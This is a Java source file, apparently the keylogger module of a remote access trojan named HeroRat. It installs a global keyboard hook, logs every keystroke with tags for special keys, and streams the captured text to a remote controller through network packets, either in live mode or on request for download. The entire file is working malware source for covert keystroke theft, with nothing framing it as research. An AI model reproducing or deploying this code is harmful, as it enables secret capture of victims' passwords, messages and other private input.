package net.herorat.features.keylogger;

import java.io.DataOutputStream;

import net.herorat.network.Packet;
import net.herorat.network.Packet4Keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class Keylogger
{
	private static DataOutputStream outputstream;
	private static boolean live = false;
	private static boolean shift = false;
	private static boolean control = false;
	private static boolean capslock = false;
	private static boolean alt_gr = false;
	private static StringBuffer buffer_download = new StringBuffer();
	private static StringBuffer buffer_live = new StringBuffer();
	
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Keylogger.outputstream = outputstream;
		
		if (args.length == 1 && args[0].equals("download"))
		{
			Packet p = new Packet4Keylogger(outputstream, new String[] { "download", buffer_download.toString() });
			p.write();
		}
		else if (args.length == 2 && args[0].equals("live"))
		{
			live = args[1].equals("true") ? true : false;
		}
	}
	
	public static void init()
	{
		try
		{
			GlobalScreen.registerNativeHook();
			GlobalScreen.getInstance().addNativeKeyListener(listener);
		}
		catch (Exception e) {}
	}
	
	private static String getChar(int key)
	{
		String value = String.valueOf((char)key);
		if (shift || capslock)
		{
			return "[SHIFT " + value + "]";
		}
		else if (control && !alt_gr)
		{
			return "[CTRL " + value + "]";
		}
		else if (alt_gr)
		{
			return "[ALTGR " + value + "]";
		}
		return value;
	}

	private static NativeKeyListener listener = new NativeKeyListener() {
		public void nativeKeyPressed(NativeKeyEvent event)
		{
			switch (event.getKeyCode())
			{
				case 9:
					buffer_download.append("[TAB]");
					buffer_live.append("[TAB]");
			    	break;
			    case 16:
			    	shift = true;
			    	break;
			    case 17:
			    	control = true;
			    	break;
			    case 18:
			    	if (control) alt_gr = true;
			    	break;
				case 20:
					capslock = !capslock;
					break;
			    case 27:
					buffer_download.append("[ESC]");
					buffer_live.append("[ESC]");
					break;
			    case 33:
					buffer_download.append("[PG UP]");
					buffer_live.append("[PG UP]");
					break;
			    case 34:
					buffer_download.append("[PG DOWN]");
					buffer_live.append("[PG DOWN]");
					break;
			    case 35:
					buffer_download.append("[END]");
					buffer_live.append("[END]");
					break;
			    case 36:
					buffer_download.append("[HOME]");
					buffer_live.append("[HOME]");
					break;
			    case 37:
					buffer_download.append("[LEFT]");
					buffer_live.append("[LEFT]");
					break;
			    case 38:
					buffer_download.append("[UP]");
					buffer_live.append("[UP]");
					break;
			    case 39:
					buffer_download.append("[RIGHT]");
					buffer_live.append("[RIGHT]");
					break;
			    case 40:
					buffer_download.append("[DOWN]");
					buffer_live.append("[DOWN]");
					break;
			    case 112:
					buffer_download.append("[F1]");
					buffer_live.append("[F1]");
					break;
			    case 113:
					buffer_download.append("[F2]");
					buffer_live.append("[F2]");
					break;
			    case 114:
					buffer_download.append("[F3]");
					buffer_live.append("[F3]");
					break;
			    case 115:
					buffer_download.append("[F4]");
					buffer_live.append("[F4]");
					break;
			    case 116:
					buffer_download.append("[F5]");
					buffer_live.append("[F5]");
					break;
			    case 117:
					buffer_download.append("[F6]");
					buffer_live.append("[F6]");
					break;
			    case 118:
					buffer_download.append("[F7]");
					buffer_live.append("[F7]");
					break;
			    case 119:
					buffer_download.append("[F8]");
					buffer_live.append("[F8]");
					break;
			    case 120:
					buffer_download.append("[F9]");
					buffer_live.append("[F9]");
					break;
			    case 121:
					buffer_download.append("[F10]");
					buffer_live.append("[F10]");
					break;
			    case 122:
					buffer_download.append("[F11]");
					buffer_live.append("[F11]");
					break;
			    case 123:
					buffer_download.append("[F12]");
					buffer_live.append("[F12]");
					break;
			    case 127:
					buffer_download.append("[DEL]");
					buffer_live.append("[DEL]");
					break;
			    case 155:
					buffer_download.append("[INS]");
					buffer_live.append("[INS]");
					break;
		    }
		}

		public void nativeKeyReleased(NativeKeyEvent event)
		{
			switch (event.getKeyCode())
			{
				case 16:
					shift = false;
					break;
				case 17:
					control = false;
					break;
			}
		}

		public void nativeKeyTyped(NativeKeyEvent event)
		{
			int key = event.getKeyChar();
			switch (key)
			{
				case 8:
					buffer_download.append("[BACKSPACE]");
					buffer_live.append("[BACKSPACE]");
					break;
				case 13:
					buffer_download.append("[RETURN]\n");
					buffer_live.append("[RETURN]\n");
					break;
				default:
					buffer_download.append(getChar(key));
					buffer_live.append(getChar(key));
					break;
			}
			
			if (live && buffer_live.length() > 5)
			{
				Packet p = new Packet4Keylogger(outputstream, new String[] { "live", buffer_live.toString() });
				p.write();
				buffer_live = new StringBuffer();
			}
			if (buffer_download.length() > 65535)
			{
				String tmp = buffer_download.substring(buffer_download.length() - 10000, buffer_download.length());
				buffer_download = new StringBuffer();
				buffer_download.append(tmp);
			}
		}
	};
}